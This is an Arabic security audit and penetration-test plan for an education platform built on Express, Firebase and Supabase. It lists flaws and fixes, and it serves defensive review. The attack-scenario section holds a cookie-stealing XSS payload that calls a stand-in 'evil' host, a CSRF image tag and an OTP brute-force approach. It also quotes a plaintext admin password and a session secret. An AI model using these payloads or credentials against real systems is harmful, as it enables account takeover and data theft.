# خطة التأمين الشاملة واختبار الاختراق — منصة المُميَّز

> **النطاق:** الكود المصدري فقط (`app.js` 2912 سطرًا، `firebase-admin.js`, `supabase-storage.js`, `sw.js`, `views/`, `.env`، `.gitignore`، `data/`). لا توجد افتراضات.
> **التاريخ:** 2026-07-13. **الهدف:** الوصول بأقصى أمان ممكن قبل الإنتاج.
> **درجة الأساس:** Security **3/10** — السبب: كلمات سر نصية + سر جلسة افتراضي ضعيف + OTP بـ `Math.random` + غياب CSRF/Rate-Limit/Helmet + **بيانات حساسة مُلتزمة في git**.

---

# المرحلة الأولى — اكتشاف سطح الهجوم (Attack Surface)

### 1.1 الصفحات (Pages)
عامة: `/`, `/courses`, `/subscriptions`, `/contact`, `/login`, `/register`, `/parent-login`, `/parent/invite/:token`.
طالب: `/student`، `/student/courses`، `/student/course/:id`، `/student/lesson/:c/:l`، `/student/exam/:c`، `/student/question-bank`، `/student/notes`، `/student/reviews`، `/student/review/:id`، `/student/subscription`، `/student/payment`، `/student/profile`، `/student/chat`.
ولي أمر: `/parent/dashboard`، `/api/parent/child-progress/:childId`.
مدير: `/admin` + لوحات `students/courses/subscriptions/payments/settings/charge-codes/announcements/quotes/send-notification/notes/reviews/chat/sub-requests/chat/:id`.

### 1.2 المسارات والـ APIs (مُلخّص)
- **عامة بلا مصادقة:** `/login` (POST)، `/register` (POST)، `/api/auth/*` (login/register/send-verify-code/verify-email/forgot-password/reset-password/parent-login)، `/api/parent/accept-invite`، `/api/toggle-dark-mode`.
- **محميّة بجلسة:** كل `/student/*` و`/api/student/*` (requireAuth/requireStudent)، `/api/parent/*` (requireParent)، **كل** `/api/admin/*` (77 مسارًا بـ requireAdmin).

### 1.3 الـ Middleware (app.js)
`requireAuth`(95)، `requireAdmin`(100)، `requireStudent`(581)، `requireStudentOrGuest`(575)، `requireParent`(1036)، `checkSubscription`(105)، `refreshSession`(123، يُطبَّق عالميًا عبر `app.use` 189).

### 1.4 الخدمات / المتحكّمات / الدوال
`firebase-admin.js`: `readData/writeData/pushData/fbRead/fbSet/fbPush/fbRemove/sendFCM/sendFCMToRole/migrateSeedData`.
`supabase-storage.js`: `ensureBucket/uploadPdf/removePdf/createSignedUploadUrl/createSignedUrl`.
**لا توجد Firebase Functions مستقلة ولا Supabase Edge Functions** (الوصول لـ RTDB والرفع يتم عبر Admin SDK من الخادم).
**لا توجد Webhooks** في الكود.

### 1.5 الحاويات والمدفونات
Supabase: حاوية `books` **خاصة** (`public:false`). Firebase: RTDB (القواعد في كونسول Firebase، **خارج المستودع**).

### 1.6 مسارات المصادقة
1) طالب: Firebase `idToken` → `verifyIdToken` خادميًا. 2) مدير/ولي أمر: بريد/هاتف + **كلمة سر نصية**. 3) نسيان كلمة/تأكيد بريد: رمز OTP 6 أرقام. 4) دعوة ولي أمر: رمز دعوة + كلمة سر.

### 1.7 خريطة سطح الهجوم
```
[زائر]──▶ صفحات عامة + /api/auth/* + /api/parent/accept-invite
            │ (قوة غاشمة على OTP/تسجيل لأن لا Rate-Limit)
            ▼
[طالب]──▶ /student/*  (idToken مُتحقَّق منه) ─▶ PDF (موقّع خادميًا) + فيديو YouTube (بلا حماية)
            │
[ولي أمر]─▶ /parent/dashboard (ملكية مُتحقَّق منها: app.js:1274)
            │
[مدير]──▶ /admin/* + /api/admin/* (77/77 بمتطلب requireAdmin)
            │
[خادم]──▶ Firebase RTDB (Admin SDK) ─┐
                              Supabase books (موقّع) ─┤─▶ أسرار: SESSION_SECRET ضعيف، users.json بنصوص في git
```

---

# المرحلة الثانية — تحليل Frontend

| العنصر | يصل للمتصفح؟ | التصنيف | السبب |
|---|---|---|---|
| `firebaseConfig` كامل (apiKey, authDomain, **databaseURL**, projectId, storageBucket, messagingSenderId, appId) | نعم (`header.ejs:27`) | **خطر جداً\*** | يكشف بنية DB + يحمّل `firebase-database-compat.js` عميلًا |
| `SUPABASE_URL` + `SUPABASE_ANON_KEY` | نعم (`header.ejs:8`) | **يحتاج تحسين** | كشف غير مبرَّر لمفتاح Supabase |
| `FIREBASE_VAPID_KEY` | نعم (`footer.ejs:69`) | مقبول | مفتاح إشعارات عام بطبيعته |
| `window.__SB_URL/__SB_ANON` | نعم (`header.ejs:8`) | **يحتاج تحسين** | نفس ما سبق |
| أسماء المسارات `/api/admin/*` | نعم (قوالب `views/admin/*`) | مقبول | محميّة بجلسة |
| اسم الحاوية `books` | غير مباشر (داخل `supabase-storage.js` المحزوم عميلًا) | مقبول | — |
| رسائل الخطأ `e.message` | نعم (`res.status(500).json({error:e.message})`) | **يحتاج تحسين** | تسريب داخلي |
| `console.error`/`console.log` | نعم (كثيرة) | **يحتاج تحسين** | تسريب محتمل لبيانات |
| Source Maps | **لا يوجد** | مقبول | مشروع بلا خطوة بناء |
| Environment Variables (NEXT_PUBLIC/VITE_) | **لا يوجد** | مقبول | بحث فارغ |
| JWT (`idToken`) | متوقع لـ Firebase | مقبول | تصميم منصة الويب |

\* رهن قواعد RTDB: إن كانت `".read":true` فالوصول المباشر لقاعدة البيانات ممكن من المتصفح.

---

# المرحلة الثالثة — تحليل Backend

| الفئة | موجود؟ | الدليل / الحالة |
|---|---|---|
| Broken Access Control | **جزئيًا آمن** | كل `/api/admin/*` محمي (77/77)؛ ملكية ولي الأمر مُتحقَّق منها (1274)؛ `/accept-invite` عام برمز (مقبول) |
| Authentication Bypass | **غير مُثبت** | لا تجاوز مُكتشف |
| Privilege Escalation | **غير مُثبت** | `firebase-admin-login` يشترط `role==='admin'` (463) |
| Missing Validation | **نعم (جزئي)** | تحقق من حقول مطلوبة فقط؛ لا تحقق نوعي عميق |
| IDOR | **مُعالَج** | `child-progress` يرفض إن لم يكن الابن ضمن `childrenIds` (1274) |
| Mass Assignment | **غير مُثبت** | `/api/student/subscribe` يأخذ `userId` من الجلسة لا من المدخل (1294) |
| Insecure Direct Object Ref | **محدود** | `note-pdf/:noteId` مقيّد بالاشتراك لا بالملكية (الملاحظات عامة للمشتركين — مقبول) |
| Race Conditions | **تكاملي لا أمني** | كتابة `data/*.json` متزامنة على Vercel للقراءة فقط → فقدان بيانات، لا استغلال أمني مباشر |
| Command Injection | **لا يوجد** | لا `child_process`/تقييم مدخلات المستخدم |
| Path Traversal | **لا يوجد** | المسار مبني خادميًا بـ UUID + تعقيم المجلد (`[a-z]` فقط) (810–811) |
| File Inclusion | **لا يوجد** | — |
| SSRF | **لا يوجد** | الجلب خادميًا من مسار DB في Supabase لا من URL مستخدم |
| XXE | **لا يوجد** | لا تحليل XML لمدخلات المستخدم |
| Open Redirect | **لا يوجد** | التحويلات لوجهات ثابتة حسب الدور |
| Prototype Pollution | **لا يوجد** | لا استخدام `__proto__` |
| Unsafe Deserialization | **لا يوجد** | لا جلسات م serialized Objects خطرة |
| NoSQL Injection | **لا يوجد** | `find` على مصفوفات JS و`set` يستبدل القيمة |
| SQL Injection | **لا ينطبق** | لا يوجد SQL |
| Header/Host Injection | **لا يوجد** | لا ثقة بمتروِّس المستخدم |
| HTTP Parameter Pollution | **محتمل منخفض** | `body-parser` يحوّل المفاتيح المكررة إلى مصفوفة |
| Business Logic | **نعم** | OTP بلا حدّ سرعة/قفل → قوة غاشمة؛ إعادة استخدام الرمز ضمن النافذة |

---

# المرحلة الرابعة — Authentication

| السؤال | الجواب | الدليل |
|---|---|---|
| هل يمكن سرقة الجلسة؟ | **نعم إن استُخدم السر الافتراضي بالإنتاج** | `app.js:24` `SESSION_SECRET || 'lughati-secret-key-2026'` |
| هل يمكن إعادة استخدام Token؟ | محدود | `idToken` قصير العمر (Firebase) — آمن؛ لا Refresh Tokens |
| هل يمكن تجاوز تسجيل الدخول؟ | **نعم عبر سرقة users.json** | كلمات سر **نصية** ومُلتزمة في git (انظر الثامنة) |
| هل يمكن انتحال مستخدم آخر؟ | **نعم (مدير/ولي أمر)** | كلمة سر نصية + لا قفل/لا Rate-Limit → قوة غاشمة على `/login` و`/api/auth/parent-login` |
| OTP قابل للكسر؟ | **نعم** | `genEmailCode` = `Math.random()` (72)، 6 أرقام، بلا حدّ سرعة → ~1M محاولة |

---

# المرحلة الخامسة — Authorization

| الصفحة / API | Guest | Student | Parent | Teacher | Admin | BAC؟ |
|---|---|---|---|---|---|---|
| `/admin/*` , `/api/admin/*` | ✗ | ✗ | ✗ | ✗ (لا دور) | ✓ | **سليم** |
| `/student/*` | ✗ (إلا العام) | ✓ | ✗ | ✗ | ✓ | **سليم** |
| `/parent/dashboard` , `/api/parent/child-progress/:id` | ✗ | ✗ | ✓ (ابنه فقط) | ✗ | ✗ | **سليم** |
| `/student/note-pdf/:id` | ✗ | ✓ (مشترك) | ✗ | ✗ | ✓ | **سليم** |
| `/api/parent/accept-invite` | ✓ (برمز) | ✗ | ✓ (برمز) | ✗ | ✗ | مقبول |

**الخلاصة:** لا يوجد Broken Access Control مُثبت؛ الخطر الأكبر في **المصادقة** (نصوص + OTP) لا في الترخيص.

---

# المرحلة السادسة — Firebase

- **Realtime Database Rules:** **غير موجودة في المستودع** (في كونسول Firebase). **يجب التحقق فورًا**. إن كانت `".read": true` أو `".write": true` فالعميل (الذي يحمّل `firebase-database-compat.js` في `header.ejs:24` ويملك `databaseURL`) يمكنه **قراءة/كتابة كامل قاعدة البيانات** مباشرةً من المتصفح.
- **Storage Rules:** لا تنطبق (التخزين في Supabase).
- **Authentication:** سليمة (التحقق عبر `verifyIdToken` خادميًا).
- **Indexes:** لا توجد استعلامات معقدة.
- **المجموعات القابلة للوصول إن كانت القواعد متساهلة:** `users`, `courses`, `subscriptions`, `subRequests`, `chats`, `chargeCodes` (كلها عبر RTDB).

---

# المرحلة السابعة — Supabase

| الوجه | الحالة |
|---|---|
| حاوية `books` | **خاصة** (`public:false`) ✓ |
| Policies / RLS | لا ينطبق (لا قاعدة Postgres) |
| Signed URLs | نعم، 30–60 ثانية ✓ |
| Anon Key | **مكشوف في الواجهة** (`header.ejs:8`) — منخفض |
| Service Role Key | **خادمي فقط** (`.env`) ✓ |
| Buckets عامة | **لا يوجد** ✓ |

---

# المرحلة الثامنة — الأسرار (Secrets) — **أخطر مرحلة**

| السر | المكان | الخطورة | النقل إلى بيئة آمنة |
|---|---|---|---|
| **كلمات سر المستخدمين (نصية)** | `data/users.json` (**مُلتزمة في git!**) | **حرجة** | تشفير (bcrypt) + **حذف الملف من git وتدوير كل الكلمات** |
| `service-account.json` (مفتاح Firebase Admin) | الجذر (احتياطي) + `.env` | **عالية** | حذف الملف؛ الاعتماد حصريًا على `FIREBASE_SERVICE_ACCOUNT` (متغير بيئة Vercel) |
| `SESSION_SECRET` | `app.js:24` + `.env:9` (قيمة ضعيفة `lughati-secret-key-2026`) | **عالية** | قيمة عشوائية 32+ بايت في Vercel |
| `SUPABASE_ANON_KEY` / `SUPABASE_URL` | `.env` + **مكشوفة عميلًا** (`header.ejs:8`) | متوسطة | متغير بيئة خادمي؛ لا إرسالها للمتصفح |
| `SMTP_PASS` | `.env` | متوسطة | متغير بيئة (متجاهل git) ✓ |
| `FIREBASE_VAPID_KEY` | `.env` + عميل | منخفضة | مقبول |
| `FIREBASE_API_KEY` | `.env` + عميل | منخفضة | مفتاح ويب عام بطبيعته |
| `fcmToken` المستخدمين | `data/users.json` | منخفضة | ضمن تشفير المستخدمين |

> **اكتشاف حرج:** `.gitignore` يتجاهل `.env` و`service-account.json` **لكنه لا يتجاهل `data/`**، وبالتالي `data/users.json` الذي يحوي **كلمة سر المدير `admin123` نصًا** هو **ملتزم في تاريخ git**. أي تسريب للـ repo يسلّم كل الحسابات. هذا يتطلب: (1) إزالة الملف من git (`git rm --cached`)، (2) تدوير كل الكلمات، (3) تشفيرها مستقبلًا.

---

# المرحلة التاسعة — OWASP Top 10 (ملخّص)

| البند | موجود؟ | الدرجة | المكان | الإصلاح |
|---|---|---|---|---|
| A01 Broken Access Control | جزئيًا | منخفضة | `app.js` | تحقق ملكية لكل مسار |
| A02 Cryptographic Failures | **نعم** | **عالية** | `app.js:24,521,72` | تشفير + أسرار عشوائية + OTP آمن |
| A03 Injection (XSS) | **نعم** | **متوسطة** | `<%-` في `course-detail.ejs:70,95,162` | هروب أو `<%= %>` |
| A04 Insecure Design | نعم | متوسطة | لا CSRF/Rate-Limit/MFA | إضافة الضوابط |
| A05 Security Misconfiguration | **نعم** | **متوسطة** | لا Helmet/ترويسات | تفعيل Helmet |
| A06 Vulnerable Components | لم يُقَم | — | `package.json` | `npm audit` دوري |
| A07 Auth Failures | **نعم** | **عالية** | `app.js:521,72` | تشفير + قفل + OTP آمن |
| A08 Data Integrity Failures | لا دليل | منخفضة | — | — |
| A09 Logging Failures | **نعم** | متوسطة | `console.error` + أخطاء مفصّلة | سجلات تدقيق + إخفاء |
| A10 SSRF | لا دليل | منخفضة | — | — |

---

# المرحلة العاشرة — اختبار الاختراق (محاكاة مهاجم)

**السيناريو 1 — زائر → سرقة حساب مدير (ممكنة: عالية)**
1. المهاجم يحصل على نسخة الـ repo (تسريب شائع) → يقرأ `data/users.json` → يجد `"email":"admin@..." , "password":"admin123"` نصًا.
2. يدخل `/login` بذلك البريد والكلمة → `app.js:521` المقارنة النصية تنجح → جلسة مدير → **سيطرة كاملة على المنصة**.
3. بديل بلا repo: قوة غاشمة على `/login` (بلا Rate-Limit، بلا قفل) لأن الكلمات ضعيفة/نصية.

**السيناريو 2 — استرداد كلمة مرور ضحية (ممكنة: عالية)**
1. يرسل المهاجم `POST /api/auth/forgot-password {email:"victim@x"}`.
2. يكرر `POST /api/auth/reset-password {email, code, newPassword}` مع `code` من `000000` إلى `999999` (بلا حدّ سرعة، نافذة 30 دقيقة) → يكسر الرمز → يستبدل كلمة الضحية.

**السيناريو 3 — وصول لبيانات عبر RTDB (مشروطة بقواعد الكونسول)**
1. المتصفح يحمّل `firebase-database-compat.js` (`header.ejs:24`) ويملك `databaseURL`.
2. إن كانت قواعد RTDB `".read":true` → `db.ref('users').once('value')` تُرجع كل البيانات (بما فيها كلمات سر نصية) مباشرةً.

**السيناريو 4 — CSRF على لوحة المدير (ممكنة: متوسطة)**
1. مدير يزور صفحة خبيثة تحوي `<img src="/api/admin/students/ID" method=DELETE>` → المتصفح يرسل الطلب بكوكي المدير → حذف طالب (بلا رمز CSRF).

**السيناريو 5 — XSS مخزَّن (ممكنة: متوسطة)**
1. مدير يُنشئ دورة بعنوان `<script>fetch('//evil/'+document.cookie)</script>`؛ يُعرض عبر `<%-` في `course-detail.ejs` → ينفّذ في متصفح الطالب.

**السيناريو 6 — وصول لفيديوهات (ممكنة: عالية)**
1. رابط YouTube مضمّن صراحةً في `lesson.videos[].url`؛ أي مستخدم (حتى زائر يملك الرابط) يشاهد المحتوى بلا اشتراك.

**السيناريو 7 — استغلال رمز الجلسة (مشروط)**
1. إن نُسي ضبط `SESSION_SECRET` بإنتاج → المهاجم يولّد كوكي موقّع بالسر المعروف `lughati-secret-key-2026` لمستخدم بصلاحية مدير → تزوير جلسة.

**النتيجة:** السيناريوهات 1، 2، 6 **ممكنة فورًا**؛ 3، 4، 5، 7 **ممكنة بظروف واقعية**.

---

# المرحلة الحادية عشرة — مراجعة الكود

| النوع | المكان | التفصيل |
|---|---|---|
| Hardcoded | `app.js:24` | `SESSION_SECRET` افتراضي ضعيف |
| Hardcoded | `sw.js:5-11` | Firebase `apiKey`/`appId` محفوران |
| Dead Code | `package.json` | `express-session` مثبّتة غير مستخدمة |
| Dead Code | `package.json` | `docx` مثبّتة غير مستخدمة |
| Dead Code | `react-components/` | مجلد `.ts`/`.tsx` مهجور (مصدر الالتباس "React") |
| Dead Code | `plyr` (npm) | غير مستخدم وقت التشغيل (يُحمّل من CDN) |
| Unused Route/File | `views/auth/auth.ejs` | **يتيم** — لا يُ rendered بأي مسار |
| Duplicated | `app.js` | مقارنة كلمة سر نصية مكرّرة (521، 1168، 447، 1138) |
| Debug Code | `app.js`/`firebase-admin.js` | إفراط `console.error`/`console.log` |
| Sensitive Comments | لا يوجد | — |
| TODO/FIXME | لا يوجد | بحث فارغ |

---

# المرحلة الثانية عشرة — مراجعة الإنتاج

| العنصر | الحالة | الدليل |
|---|---|---|
| Security Headers (Helmet) | **غائبة** | بحث فارغ |
| HTTPS | موجود (Vercel) | — |
| HSTS | **غائب** | لا ترويسة |
| CSP | **غائب** | لا ترويسة (يسهّل XSS) |
| X-Frame-Options | **غائب** | Clickjacking ممكن على اللوحات |
| X-Content-Type-Options | **غائب** | — |
| Referrer-Policy | **غائب** | — |
| Permissions-Policy | **غائب** | — |
| Rate Limiting | **غائب** | — |
| CORS | لا يُهيّأ (مقبول لعدم حاجة) | — |
| Compression | افتراضي Vercel | — |
| Caching | `sw.js` network-first + `no-cache` لـ sw/manifest | ✓ |
| Source Maps | **لا يوجد** | ✓ |
| Production Mode | `secure` للكوكي بشرط `NODE_ENV==='production'` | `app.js:28` ✓ |
| Debug Mode | لا يوجد | ✓ |
| Error Pages | نصوص عامة، لكن **JSON يرجع `e.message`** | `app.js:455,419,374` |
| Robots.txt | **لا يوجد** | يُنصح بإضافته |
| Sitemap | **لا يوجد** | — |

---

# المرحلة الثالثة عشرة — التقييم النهائي

## ج.1 الجدول الرئيسي

| المشكلة | الملف | الخطورة | إمكانية الاستغلال | الأولوية | طريقة الإصلاح |
|---|---|---|---|---|---|
| كلمات سر نصية + **مُلتزمة في git** (`users.json`) | `app.js:521`, `data/users.json` | **حرجة** | عالية | P0 | تشفير bcrypt + إزالة الملف من git + تدوير الكلمات |
| سر جلسة افتراضي ضعيف | `app.js:24` | **عالية** | متوسطة | P0 | قيمة عشوائية 32+ بايت في Vercel |
| OTP بـ `Math.random` + بلا حدّ سرعة | `app.js:72` | **عالية** | عالية | P0 | `crypto.randomBytes` + Rate-Limit + قفل |
| لا Rate-Limiting | عام | **متوسطة** | عالية | P1 | `express-rate-limit` على المصادقة |
| لا CSRF | عام | **متوسطة** | متوسطة | P1 | رمز CSRF + `sameSite` صارم |
| لا Helmet/ترويسات أمان | `app.js` | **متوسطة** | متوسطة | P1 | تفعيل `helmet` |
| كشف `SUPABASE_ANON_KEY`+`URL` عميلًا | `header.ejs:8` | متوسطة | منخفضة | P2 | إزالة السطر |
| كشف `firebaseConfig`+تحميل DB SDK عميلًا | `header.ejs:24,27` | متوسطة* | مشروط بقواعد RTDB | P1 | عدم تحميل DB SDK + App Check + التحقق من القواعد |
| XSS مخزَّن (`<%-`) | `course-detail.ejs:70,95,162` | متوسطة | متوسطة | P1 | هروب المحتوى |
| احتياطي `service-account.json` | `firebase-admin.js:22-26` | متوسطة | منخفضة | P1 | حذف الملف؛ اعتماد متغير بيئة |
| أخطاء مفصّلة للمستخدم | `app.js:455,419,374` | منخفضة | منخفضة | P2 | رسائل عامة + سجلات خادم |
| فيديوهات بلا حماية | `lesson.ejs` | متوسطة | عالية | P2 | قفل مجال يوتيوب/Vimeo |

\* رهن قواعد RTDB في الكونسول.

## ج.2 Critical
- لا يوجد بند "Critical" مُسمّى صراحةً، لكن **ثلاثة حرجات فعلية**: (1) كلمات سر نصية مُلتزمة في git، (2) سر جلسة ضعيف، (3) OTP ضعيف بلا حدّ سرعة — مجتمعة تسمح باختراق كامل.

## ج.3 High
1. كلمات سر نصية (`app.js:521`).
2. سر جلسة افتراضي (`app.js:24`).
3. OTP بـ `Math.random` (`app.js:72`).

## ج.4 Medium
1. لا Rate-Limiting. 2. لا CSRF. 3. لا Helmet. 4. كشف `SUPABASE_ANON_KEY`. 5. كشف `firebaseConfig` + DB SDK. 6. XSS مخزَّن. 7. احتياطي `service-account.json`. 8. فيديوهات بلا حماية.

## ج.5 Low
1. أخطاء مفصّلة للمستخدم. 2. إفراط `console.log`.

## ج.6 الدرجات
- **Security Score: 3 / 10**
- **Production Readiness: 3 / 10** (أسرار في git، لا ترويسات، لا حدّ سرعة)
- **Architecture Security: 5 / 10** (تصميم حماية PDF سليم، حاوية خاصة، تبويب صلاحيات سليم — لكن تحميل DB SDK عميلًا وتخزين نصي يجرّانه للأسفل)

---

# الملاحق

## ملحق 1 — ما يصل للـ Frontend ولا يجب أن يصل
1. `firebaseConfig` كامل متضمّن `databaseURL` (`header.ejs:27`).
2. `SUPABASE_URL` + `SUPABASE_ANON_KEY` (`header.ejs:8`).
3. رسائل خطأ الخادم `e.message` (استجابات `500`).
4. `console.error` الحساسة (بريد/رموز) في `firebase-admin.js` و`app.js`.
5. وصول مباشر محتمل لـ RTDB إن كانت القواعد متساهلة (`header.ejs:24`).

## ملحق 2 — APIs يلزم نقل جزء من منطقها إلى Backend
1. **كل مسارات المصادقة:** إضافة Rate-Limit + قفل محاولات على الخادم (`/login`, `/api/auth/*`).
2. **توليد OTP:** يجب أن يكون عبر `crypto` خادميًا لا `Math.random` (موجود فعلًا خادميًا لكن بـ random).
3. **التحقق من الرمز:** إضافة حدّ سرعة لكل من `verify-email`/`reset-password`/`send-verify-code`.
4. **حماية CSRF:** كل `POST/PUT/DELETE` (خاصة `/api/admin/*`) يجب أن تحمل رمز CSRF مُتحقَّق منه خادميًا.

## ملحق 3 — معلومات تساعد المهاجم على فهم المشروع
1. بنية DB (`databaseURL` + أسماء المجموعات users/courses/subscriptions/chats).
2. اسم الحاوية `books`.
3. أسماء المسارات الإدارية الكاملة (`views/admin/*`).
4. أسماء الخدمات (`firebase-admin`, `supabaseStorage`) والدوال الداخلية (`sendFCM`, `genEmailCode`, `sessionUser`).
5. هيكل كائن المستخدم (`id, uid, role, subscriptionStatus, childrenIds, referralCode`).

## ملحق 4 — التحسينات المطلوبة قبل الإطلاق (Launch Checklist)
- [ ] **P0** تشفير كل كلمات السر (bcrypt) + إزالة `data/users.json` من git + تدوير كل الحسابات (خاصة `admin123`).
- [ ] **P0** تعيين `SESSION_SECRET` عشوائي في Vercel.
- [ ] **P0** استبدال `Math.random()` بـ `crypto.randomBytes` + حدّ سرعة على رموز OTP.
- [ ] **P1** تفعيل `helmet` + ترويسات HSTS/CSP/X-Frame-Options.
- [ ] **P1** إضافة `express-rate-limit` على كل مسارات المصادقة.
- [ ] **P1** إضافة حماية CSRF لكل مسارات الحالة المتغيرة.
- [ ] **P1** التحقق من قواعد RTDB في كونسول Firebase (يجب ألا تكون `".read":true`) + عدم تحميل `firebase-database-compat.js` عميلًا.
- [ ] **P1** إزالة `SUPABASE_ANON_KEY`/`SUPABASE_URL` من `header.ejs:8`.
- [ ] **P1** هروب المحتوى في كل قوالب `<%-` التي تعرض مدخلات مستخدم/مدير.
- [ ] **P1** حذف `service-account.json` من شجرة العمل والاعتماد على متغير بيئة `FIREBASE_SERVICE_ACCOUNT`.
- [ ] **P2** قفل مجال يوتيوب أو نقل الفيديو إلى خدمة بحماية مجال.
- [ ] **P2** إضافة `robots.txt` + صفحات خطأ مخصصة + إخفاء الأخطاء عن المستخدم.
- [ ] **P2** حذف الكود المهجور (`express-session`, `docx`, `plyr` npm، `react-components/`، `auth.ejs` اليتيم).
- [ ] **مستمر** تشغيل `npm audit` دوري + سجلات تدقيق (Audit Log) للأحداث الحساسة.

> **ختام:** كل بند مبني على دليل من الكود بتاريخ 2026-07-13. بنود "قواعد RTDB/Supabase RLS" خارج نطاق المستودع وتتطلب تحققًا من لوحات التحكم. لم تُدعَ أي ثغرة دون دليل.
